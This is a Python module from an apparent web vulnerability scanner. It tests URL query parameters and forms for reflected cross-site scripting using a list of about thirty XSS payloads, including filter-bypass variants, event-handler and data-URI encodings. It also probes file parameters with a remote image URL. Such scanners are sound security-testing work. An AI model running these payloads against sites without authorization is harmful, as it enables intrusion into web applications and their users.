from ..utils import dict_iterate, update_url_params, get_url_host, get_url_query, modify_parameter, SCRIPTABLE_ATTRS
from ..client import NotAPage, RedirectedToExternal

XSS_STRING = "alert('xssed')"
INJECTIONS = (
    "\"><script>alert('xssed')</script>",
    "\"><sCriPt>alert('xssed')</sCriPt>",
    "\"; alert('xssed')",
    "\"></sCriPt><sCriPt >alert('xssed')</sCriPt>",
    "\"><img Src=0x94 onerror=alert('xssed')>",
    "\"><BODY ONLOAD=alert('xssed')>",
    "'%2Balert('xssed')%2B'",
    "\"><'xssed'>",
    "'+alert('xssed')+'",
    "%2Balert('xssed')%2B'",
    "'\"--></style></script><script>alert('xssed')</script>",
    "'</style></script><script>alert('xssed')</script>",
    "</script><script>alert('xssed')</script>",
    "</style></script><script>alert('xssed')</script>",
    "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94('xssed')%3C",
    "'\"--></style></script><script>alert('xssed')</script>",
    "';alert('xssed')'",
    "<scr<script>ipt>alert('xssed')</script>",
    "<scr<script>ipt>alert('xssed')</scr</script>ipt>",
    "\"<scr<script>ipt>alert('xssed')</scr</script>ipt>",
    "\"><scr<script>ipt>alert('xssed')</script>",
    "\">'</style></script><script>alert('xssed')</script>",
    "\"></script><script>alert('xssed')</script>",
    "\"></style></script><script>alert('xssed')</script>",
    "<IMG SRC=\" &#14;  javascript:alert('xssed');\">",
    "</title>\"><a href=\"javascript:alert('xssed');\">",
    "</title>\"><iframe onerror=\"alert('xssed');\" src=x></iframe>",
    "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzZWQnKTwvc2NyaXB0Pg==\">",
    "<img src=x onerror=alert('xssed')>",
    "<scri%00pt>alert('xssed');</scri%00pt>",
    "<svg/onload=alert('xssed');>",
    "<iframe/src=\"data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KCd4c3NlZCcpPg==\">"
)

FILE_INJECTION = 'https://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg'

def xss(page, client, log):
    url_xss(page.url, client, log)

    for form in page.get_forms():
        if get_url_host(page.url) != get_url_host(form.action):
            continue

        form_parameters = dict(form.get_parameters())
        report = {'params': [], 'injections': []}
        for param, value in dict_iterate(form_parameters):
            for injection in INJECTIONS:
                injected_params = modify_parameter(form_parameters, param, str(value) + injection)

                try:
                    res_page = form.send(client, injected_params)
                except (NotAPage, RedirectedToExternal) as e:
                    continue

                if res_page.document.find_all(contains_injection):
                    report['request'] = res_page.request
                    report['params'].append(param)
                    if not injection in report['injections']:
                        report['injections'].append(injection)

        if report['params']:
            log('vuln', 'xss', form.action, report['params'], injections=report['injections'], request=report['request'], page_url=page.url)

def url_xss(url, client, log):
    query = get_url_query(url)

    report = {'params': [], 'injections': []}
    for param, value in dict_iterate(query):
        for injection in INJECTIONS:
            injected_url = update_url_params(url, {param: str(value) + injection})

            try:
                res_page = client.get(injected_url)
            except (NotAPage, RedirectedToExternal) as e:
                continue

            if res_page.document.find_all(contains_injection):
                report['request'] = res_page.request
                report['params'].append(param)
                if not injection in report['injections']:
                    report['injections'].append(injection)

        if 'file' in param:
            injected_url = update_url_params(url, {param: FILE_INJECTION})
            try:
                res_page = client.get(injected_url, ignore_type=True)
            except RedirectedToExternal:
                continue

            if res_page.response.status_code == 200 and res_page.response.headers.get('content-type') == 'image/jpeg':
                log('vuln', 'xss_file', url, param, injections=[FILE_INJECTION], request=res_page.request, page_url=url)

    if report['params']:
        log('vuln', 'xss', url, report['params'], injections=report['injections'], request=report['request'], page_url=url)

def contains_injection(tag):
    return any(k in SCRIPTABLE_ATTRS and XSS_STRING in v \
        or k in ('src', 'href') and v == "javascript:alert('xssed')" for k, v in dict_iterate(tag.attrs)) \
        or tag.name == 'script' and list(tag.strings) and XSS_STRING in list(tag.strings)[0]
